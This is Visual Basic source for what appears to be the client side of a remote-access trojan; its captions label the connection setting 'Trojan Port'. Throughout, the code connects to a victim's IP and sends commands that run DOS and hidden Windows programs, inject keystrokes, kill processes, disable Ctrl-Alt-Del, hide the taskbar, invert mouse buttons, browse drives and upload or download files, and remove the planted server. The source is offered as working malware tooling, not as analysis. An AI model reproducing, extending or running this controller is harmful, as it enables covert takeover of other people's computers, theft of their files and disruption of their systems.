   bDadosEnviados = False
End Sub
Private Sub BotaoComando_Click()
   If TextComando.Text <> "" Then
      EnviaString COMMAND_EXECUTE_DOS + TextComando.Text
   End If
End Sub

Private Sub BotaoDerrubar_Click()
   EnviaString COMMAND_HANGUP
End Sub

Private Sub BotaoHideTaskbar_Click()
   EnviaString COMMAND_TASKBAR_HIDE
End Sub

Private Sub BotaoShowTaskbar_Click()
   EnviaString COMMAND_TASKBAR_SHOW
End Sub

Private Sub BotaoMouseTroca_Click()
   EnviaString COMMAND_MOUSE_CHANGE
End Sub

Private Sub BotaoMouseNormal_Click()
   EnviaString COMMAND_MOUSE_NORMAL
End Sub

Private Sub BotaoCtrlAltDelEnable_Click()
   EnviaString COMMAND_CTRLALTDEL_ENABLE
End Sub

Private Sub BotaoCtrlAltDelDisable_Click()
   EnviaString COMMAND_CTRLALTDEL_DISABLE
End Sub

Private Sub BotaoAbrirCD_Click()
   EnviaString COMMAND_CDROM_OPEN
End Sub

Private Sub BotaoFecharCD_Click()
   EnviaString COMMAND_CDROM_CLOSE
End Sub

Private Sub BotaoDoubleClickOn_Click()
   EnviaString COMMAND_DOUBLECLICK_ON
End Sub

Private Sub BotaoDoubleClickOff_Click()
   EnviaString COMMAND_DOUBLECLICK_OFF
End Sub

Private Sub BotaoClipboardOn_Click()
   EnviaString COMMAND_CLIPBOARD_ON
End Sub

Private Sub BotaoClipboardOff_Click()
   EnviaString COMMAND_CLIPBOARD_OFF
End Sub

Private Sub BotaoConectar_Click()
   On Error Resume Next

   nTrojanPort = Val(TextPortaTrojan.Text)

   LimparControles
   BotaoConectar.Enabled = False
   BotaoDesconectar.Enabled = True

   While WinSockClient.State <> sckClosed
      WinSockClient.Close
      WinsockTransfer.Close
      DoEvents
   Wend

   WinSockClient.RemoteHost = TextIP.Text
   WinSockClient.RemotePort = nTrojanPort
   WinSockClient.Connect

   WinsockTransfer.RemoteHost = TextIP.Text
   WinsockTransfer.RemotePort = nTrojanPort + 1
   WinsockTransfer.Connect

End Sub

Private Sub BotaoDesconectar_Click()
   LabelStatus.Caption = "Disconnected"

   BotaoDesconectar.Enabled = False

   LimparControles
End Sub

Private Sub BotaoResolucao_Click()
   ListResolucao.Clear

   EnviaString COMMAND_RESOLUTION
End Sub

Private Sub ListResolucao_DblClick()
   EnviaString COMMAND_RESOLUTION + CStr(ListResolucao.ListIndex + 1)
End Sub

Private Sub BotaoEnviarMensagem_Click()
   EnviaString COMMAND_MESSAGE + TextMensagemEnviada.Text
End Sub

Private Sub BotaoEnviaTeclas_Click()
   If TextEnviarTeclas.Text <> "" Then
      EnviaString COMMAND_SENDKEYS + TextEnviarTeclas.Text
   End If
End Sub

Private Sub BotaoLimpaTeclas_Click()
   TextEnviarTeclas.Text = ""
End Sub

Private Sub BotaoTeclas_Click(Index As Integer)
   TextEnviarTeclas.Text = TextEnviarTeclas.Text + BotaoTeclas(Index).Tag
End Sub

Private Sub BotaoMultimidiaAVI_Click()
   ListMultimidia.Clear

   EnviaString COMMAND_FIND_MULTIMEDIA + "*.AVI"
End Sub

Private Sub BotaoMultimidiaWAV_Click()
   If lAudio Then
      ListMultimidia.Clear

      EnviaString COMMAND_FIND_MULTIMEDIA + "*.WAV"
   Else
      MsgBox "Server Without Sound Card"
   End If
End Sub

Private Sub BotaoPesquisarArquivos_Click()
   If TextPesquisarArquivos.Text = "" Then
      MsgBox "Type the files for find", , cTituloCurto

   Else
      ListPesquisarArquivos.Clear

      EnviaString COMMAND_FIND_FILE & TextPesquisarArquivos.Text
   End If
End Sub

Private Sub BotaoProcessos_Click()
   ListProcessos.Clear

   EnviaString COMMAND_PROCESS_OPEN
End Sub

Private Sub BotaoResetar_Click()
   EnviaString COMMAND_RESET
End Sub

Private Sub BotaoRemoveServer_Click()
   If MsgBox("Remove Server ?", vbYesNo) = vbYes Then
      If MsgBox("Continue ?", vbYesNo) = vbYes Then
         EnviaString COMMAND_REMOVE_SERVER + "GyhwsmofyDiubndBzcvHlmjlrtacg"
      End If
   End If
End Sub

Private Sub BotaoSair_Click()
   BotaoDesconectar_Click

   End
End Sub

Private Sub BotaoDiretorio_Click()
   EnviaString COMMAND_CURRENT_DIRECTORY
End Sub

Private Sub BotaoWindows_Click()
   If TextComandoWindows.Text <> "" Then
      If CheckWindows.Value Then
         EnviaString COMMAND_EXECUTE + TextComandoWindows.Text
      Else
         EnviaString COMMAND_EXECUTE_HIDDEN + TextComandoWindows.Text
      End If
   End If
End Sub

Private Sub ListBitmap_DblClick()
   If MsgBox("Confirm the new Wallpaper ?", vbYesNo, cTituloCurto) = vbYes Then
      EnviaString COMMAND_CHANGE_WALLPAPER + ListBitmap.List(ListBitmap.ListIndex)
   End If
End Sub

Private Sub ListMultimidia_DblClick()
   If MsgBox("Play the file ?", vbYesNo, cTituloCurto) = vbYes Then
      EnviaString COMMAND_PLAY_WAV_AVI + ListMultimidia.List(ListMultimidia.ListIndex)
   End If
End Sub

Private Sub ListProcessos_DblClick()
   On Error Resume Next

   Dim cEscolhido As String

   If MsgBox("Kill this Process ?", vbYesNo, cTituloCurto) = vbYes Then
      cEscolhido = ListProcessos.List(ListProcessos.ListIndex) + ":"
      cEscolhido = Trim(Left(cEscolhido, InStr(cEscolhido, ":") - 1))

      If cEscolhido <> "" Then
         EnviaString COMMAND_KILL_PROCESS + cEscolhido

         BotaoProcessos_Click
      End If
   End If
End Sub

Private Sub WinSockClient_Connect()
   On Error Resume Next

   EnviaString COMMAND_CONNECT
End Sub

Private Sub WinSockClient_DataArrival(ByVal bytesTotal As Long)
   On Error Resume Next
   Dim cDataReceived As String
   Dim cDataNew As String

   WinSockClient.GetData cDataReceived

   If Right(cDataReceived, 1) <> Chr$(8) Then
      cDataReceived = cDataReceived + Chr$(8)
   End If

   While InStr(cDataReceived, Chr$(8)) <> 0
       cDataNew = Left( cDataReceived, InStr(cDataReceived, Chr$(8)) - 1 )
       cDataReceived = Mid( cDataReceived, InStr(cDataReceived, Chr$(8)) + 1 )

       VerificaResposta cDataNew
   Wend
End Sub

Private Sub WinSockClient_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
   ' MsgBox "Error: " & Number & " " & Description, , cTituloCurto

   MsgBox "Not Connected", , cTituloCurto
   WinsockClient.close
   BotaoDesconectar_Click
End Sub

Private Sub VerificaResposta(cDataReceived As String, Optional SockTransfer As Boolean)
   On Error Resume Next

   Dim cCommandCode As String
   Dim cDigitou As String
   Dim cSendUploadDownload As String
   Dim cByteUploadDownload As String
   Dim cFileSource As String
   Dim cFileTarget As String
   Dim cArquivo As String
   Dim nLoop As Long

   cCommandCode = Left(cDataReceived, 3)
   cDataReceived = Mid$(cDataReceived, 4, Len(cDataReceived))

   Select Case cCommandCode
      Case ANSWER_CONNECTED
         FramePrincipal.Visible = True

         LabelStatus.Caption = "OK"
         LabelStatus.Caption = "Connected"

         EnviaString COMMAND_COMPUTER
         EnviaString COMMAND_SOUND_CARD
         EnviaString COMMAND_CHANGE_DRIVE

         BotaoProcessos_Click
         BotaoResolucao_Click

      Case ANSWER_OK
         LabelStatus.Caption = cDataReceived

      Case ANSWER_INVALID
         LabelStatus.Caption = "Invalid Command"

      Case ANSWER_STARTING
         LabelStatus.Caption = "Wait ... Starting"

      Case ANSWER_ENDING
         LabelStatus.Caption = "Ending"

      Case ANSWER_FOUND
         LabelStatus.Caption = "Found"

      Case ANSWER_NOT_FOUND
         LabelStatus.Caption = "Not found"

      Case ANSWER_PASSWORD_TYPE
         cDigitou = InputBox("Password:", cTituloCurto, "")

         If cDigitou = "" Then
            VerificaResposta ANSWER_PASSWORD_INVALID

         ElseIf UCase$(cDigitou) = "EXIT" Then
            End

         Else
            EnviaString COMMAND_PASSWORD + cDigitou
         End If

      Case ANSWER_PASSWORD_INVALID
         MsgBox "Invalid password", , cTituloCurto

         End

      Case COMMAND_UPLOAD_FILE
         cFileSource = Left$(cDataReceived, InStr(cDataReceived, Chr$(9)) - 1)
         cFileTarget = Mid$(cDataReceived, InStr(cDataReceived, Chr$(9)) + 1)

         If Dir(cFileSource) = "" Then
            WinsockTransfer.SendData ANSWER_END_UPLOAD_FILE

         Else
            If hFileUploadDownload <> 0 Then
               Close #hFileUploadDownload
            End If

            hFileUploadDownload = FreeFile
            Open cFileSource For Binary Access Read As #hFileUploadDownload

            lDownloadUpload = True

            BytesToRead = FileLen(cFileSource)
            WinsockTransfer.SendData COMMAND_START_UPLOAD_FILE & cFileTarget

         End If

      Case ANSWER_READ_UPLOAD_FILE
         Call VerificaDados(cCommandCode + cDataReceived)

      Case ANSWER_START_DOWNLOAD_FILE 
         Call VerificaDados(cCommandCode + cDataReceived)
      Case ANSWER_PROCESS_OPEN
         If cDataReceived <> "" Then
            ListProcessos.AddItem cDataReceived
         End If

      Case ANSWER_PROCESS_CANNOT_REMOVED, ANSWER_PROCESS_WITHOUT_PERMISSION
         LabelStatus.Caption = cDataReceived

      Case ANSWER_CURRENT_DIRECTORY
         BotaoDiretorio.Caption = "Current Drive/Directory:   " + cDataReceived

      Case ANSWER_MESSAGE
         TextMensagemRecebida.Text = cDataReceived

      Case ANSWER_COMPUTER
         TextInformacoesComputador.Text = cDataReceived

      Case ANSWER_SOUND_CARD
         lAudio = (cDataReceived = "T")

      Case ANSWER_PLAY_WAV_AVI
         LabelStatus.Caption = "Playing the multimedia file"

      Case ANSWER_REMOVE_SERVER
         BotaoDesconectar_Click
         Exit Sub

      Case ANSWER_DRIVE
         ListRemoteDrive.AddItem cDataReceived

      Case ANSWER_DIRECTORY_DEFAULT
         cRemoteDirectory = cDataReceived

         If Right$(cRemoteDirectory, 1) <> "\" Then
            cRemoteDirectory = cRemoteDirectory + "\"
         End If

      Case ANSWER_DIRECTORY
         ListRemoteDiretorios.AddItem cDataReceived

      Case ANSWER_FILES_NAME
         ListRemoteArquivos.AddItem cDataReceived

      Case ANSWER_FIND_FILE
         ListPesquisarArquivos.AddItem cDataReceived

      Case ANSWER_FIND_BITMAP
         ListBitmap.AddItem cDataReceived

      Case ANSWER_FIND_MULTIMEDIA
         ListMultimidia.AddItem cDataReceived

      Case ANSWER_RESOLUTION
         ListResolucao.AddItem cDataReceived

      Case ANSWER_EXECUTE_DOS
         TextResultadoComando.Text = cDataReceived
   End Select
End Sub

Private Sub LimparControles()
   On Error Resume Next

   TextInformacoesComputador.Text = ""
   TextPesquisarArquivos.Text = ""
   TextMensagemRecebida.Text = ""
   TextMensagemEnviada.Text = ""
   TextResultadoComando.Text = ""
   TextComando.Text = ""
   TextEnviarTeclas.Text = ""

   BotaoConectar.Enabled = True
   FramePrincipal.Visible = False
   lAudio = False
   lUploadDownload = False

   If hFileUploadDownload <> 0 Then
      Close #hFileUploadDownload

      hFileUploadDownload = 0
   End If

   ListPesquisarArquivos.Clear
   ListMultimidia.Clear
   ListUploadDownload.Clear
   ListRemoteDiretorios.Clear
   ListRemoteArquivos.Clear
   ListRemoteDrive.Clear
   ListProcessos.Clear
   ListResolucao.Clear
   ListBitmap.Clear

   LabelStatus = "Status ..."

   LabelPorta.Caption = "Trojan Port:"
   BotaoConectar.Caption = "Connect"
   BotaoDesconectar.Caption = "Disconnect"
   BotaoSair.Caption = "Exit"

   BotaoFrame(0).Caption = "Computer Information"
   BotaoFrame(1).Caption = "Messages (Chat)"
   BotaoFrame(2).Caption = "Keyboard (Send Keys)"
   BotaoFrame(4).Caption = "Execute Commands"
   BotaoFrame(5).Caption = "Active Process"
   BotaoFrame(6).Caption = "Find Files"
   BotaoFrame(7).Caption = "WallPaper"
   BotaoFrame(8).Caption = "Multimedia"
   BotaoFrame(9).Caption = "File Transfer"
   BotaoFrame(10).Caption = "Special"

   BotaoDiretorio.Caption = "Click here for get current Drive and Directory"

   LabelMensagemEnviada.Caption = "Send message:"
   LabelMensagemRecebida.Caption = "Received message:"
   BotaoEnviarMensagem.Caption = "Send"

   LabelEnviarTeclas.Caption = "Send:"
   BotaoEnviaTeclas.Caption = "Send"
   BotaoLimpaTeclas.Caption = "Clean"

   LabelResultadoComando.Caption = "Result of the command:"
   LabelWindows.Caption = "Windows Command:"
   LabelDOS.Caption = "DOS Command:"
   CheckWindows.Caption = "Allow the user to see the execution of the program ?"
   TextComandoWindows.Text = "Type here the Windows command/program to be executed"
   TextComando.Text = "Type here the command DOS and wait answer..."
   BotaoComando.Caption = "Send"
   BotaoWindows.Caption = "Send"

   BotaoAbrirCD.Caption = "Open CD"
   BotaoFecharCD.Caption = "Close CD"
   BotaoDoubleClickOn.Caption = "Double Click On"
   BotaoDoubleClickOff.Caption = "Double Click Off"
   BotaoClipboardOn.Caption = "Clipboard On"
   BotaoClipboardOff.Caption = "Clipboard Off"
   BotaoResetar.Caption = "Reset"
   BotaoDerrubar.Caption = "Hang up"
   BotaoRemoveServer.Caption = "Server Remove"
   BotaoShowTaskbar.Caption = "Taskbar ON"
   BotaoHideTaskbar.Caption = "Taskbar OFF"
   BotaoMouseTroca.Caption = "Invert Mouse Buttons"
   BotaoMouseNormal.Caption = "Mouse Buttons OK"
   BotaoCtrlAltDelEnable.Caption = "Ctrl Alt Del On"
   BotaoCtrlAltDelDisable.Caption = "Ctrl Alt Del Off"

   LabelAvisoProcessos.Caption = "Give a double click in the process to eliminate it of the memory"
   LabelProcessos.Caption = "Active Process:"
   BotaoProcessos.Caption = "Process"

   LabelPapelParede.Caption = "Give a double click in the file to activate it as the new wall paper"
   BotaoPesquisaBitmap.Caption = "Find files"
   BotaoApagarBitmap.Caption = "Turn off wall paper"

   LabelPesquisaArquivos.Caption = "Find the files:"
   BotaoPesquisarArquivos.Caption = "Find"

   LabelMultimidia.Caption = "Give a double click in the file to reproduce it"
   BotaoMultimidiaAVI.Caption = "Find AVI files"
   BotaoMultimidiaWAV.Caption = "Find WAV files"

   BotaoResolucao.Caption = "Find Monitor Resolution"
End Sub

Public Sub EnviaString(cString As String, Optional EnviaSockTransfer As Boolean)

   On Error Resume Next

   If Not EnviaSockTransfer Then
    WinSockClient.SendData cString + Chr$(8)

   Else
       WinsockTransfer.SendData cString

   End If

   cString = ""
End Sub

Private Sub DriveLocal_Change()
   On Error GoTo DriveError
   DirLocal.Path = DriveLocal.Drive
   Exit Sub

DriveError:
   DriveLocal.Drive = Left$(DirLocal.Path, 2)
   DirLocal.Path = DriveLocal.Drive

   Exit Sub
End Sub

Private Sub DirLocal_Change()
   On Error Resume Next

   FileLocal.Path = DirLocal.Path
End Sub

Private Sub FileLocal_DblClick()
   BotaoUploadFiles_Click
End Sub

Private Sub ListRemoteDrive_DblClick()
   On Error Resume Next

   Dim cDrive As String
   cDrive = ListRemoteDrive.List(ListRemoteDrive.ListIndex)

   ListRemoteDrive.Clear
   ListRemoteDiretorios.Clear
   ListRemoteArquivos.Clear

   EnviaString COMMAND_CHANGE_DRIVE + cDrive
End Sub

Private Sub ListRemoteDiretorios_DblClick()
   On Error Resume Next

   Dim cPath As String
   cPath = ListRemoteDiretorios.List(ListRemoteDiretorios.ListIndex)

   ListRemoteDiretorios.Clear
   ListRemoteArquivos.Clear

   EnviaString COMMAND_CHANGE_DIRECTORY + cPath
End Sub

Private Sub ListRemoteArquivos_DblClick()
   BotaoDownloadFiles_Click
End Sub

Private Sub ListUploadDownload_DblClick()
   On Error Resume Next

   If lUploadDownload Then
      If ListUploadDownload.ListIndex = 0 Then
         If Left$(ListUploadDownload.List(ListUploadDownload.ListIndex), 1) = "U" Then
            EnviaString COMMAND_END_DOWNLOAD_FILE
         ElseIf Left$(ListUploadDownload.List(ListUploadDownload.ListIndex), 1) = "D" Then
            EnviaString COMMAND_END_UPLOAD_FILE
         End If
      End If

      lUploadDownload = False
      NextUploadDownload
   End If

   ListUploadDownload.RemoveItem ListUploadDownload.ListIndex
End Sub

Private Sub BotaoDownloadFiles_Click()
   On Error Resume Next

   Dim cArquivo As String
   Dim cString As String
   Dim cPath As String

   Dim lErro As Boolean

   Dim nLoop2 As Long
   Dim nLoop As Long

   cPath = FileLocal.Path
   If Right$(cPath, 1) <> "\" Then
      cPath = cPath + "\"
   End If

   For nLoop = 0 To ListRemoteArquivos.ListCount - 1
       If ListRemoteArquivos.Selected(nLoop) Then
          cArquivo = cRemoteDirectory + ListRemoteArquivos.List(nLoop)

          cString = "Download" & Chr$(9) & cArquivo & Chr$(9) & cPath & ListRemoteArquivos.List(nLoop)

          lErro = False
          For nLoop2 = 0 To ListUploadDownload.ListCount - 1
              If ListUploadDownload.List(nLoop2) = cString Then
                 lErro = True
                 Exit For
              End If
          Next

          If Not lErro Then
             ListUploadDownload.AddItem cString
          End If
       End If
   Next

   NextUploadDownload
End Sub

Private Sub BotaoUploadFiles_Click()
   On Error Resume Next

   Dim cArquivo As String
   Dim cString As String
   Dim cPath As String

   Dim lErro As Boolean

   Dim nLoop2 As Long
   Dim nLoop As Long

   cPath = FileLocal.Path
   If Right$(cPath, 1) <> "\" Then
      cPath = cPath + "\"
   End If

   For nLoop = 0 To FileLocal.ListCount - 1
       If FileLocal.Selected(nLoop) Then
          cArquivo = cPath + FileLocal.List(nLoop)

          cString = "Upload  " & Chr$(9) & cArquivo & Chr$(9) & cRemoteDirectory & FileLocal.List(nLoop)

          lErro = False
          For nLoop2 = 0 To ListUploadDownload.ListCount - 1
              If ListUploadDownload.List(nLoop2) = cString Then
                 lErro = True
                 Exit For
              End If
          Next

          If Not lErro Then
             ListUploadDownload.AddItem cString
          End If
       End If
   Next

   NextUploadDownload
End Sub

Public Sub NextUploadDownload()
   On Error Resume Next

   If Not lUploadDownload Then
      If ListUploadDownload.ListCount >= 1 Then
         If Left$(ListUploadDownload.List(0), 1) = "U" Then
            VerificaResposta COMMAND_UPLOAD_FILE & Mid$(ListUploadDownload.List(0), InStr(ListUploadDownload.List(0), Chr$(9)) + 1), True

         ElseIf Left$(ListUploadDownload.List(0), 1) = "D" Then
            EnviaString COMMAND_DOWNLOAD_FILE & Mid$(ListUploadDownload.List(0), InStr(ListUploadDownload.List(0), Chr$(9)) + 1)

         End If
      End If
   End If
End Sub

Public Sub DownloadFile()
   EnviaString COMMAND_READ_DOWNLOAD_FILE
   DoEvents
End Sub
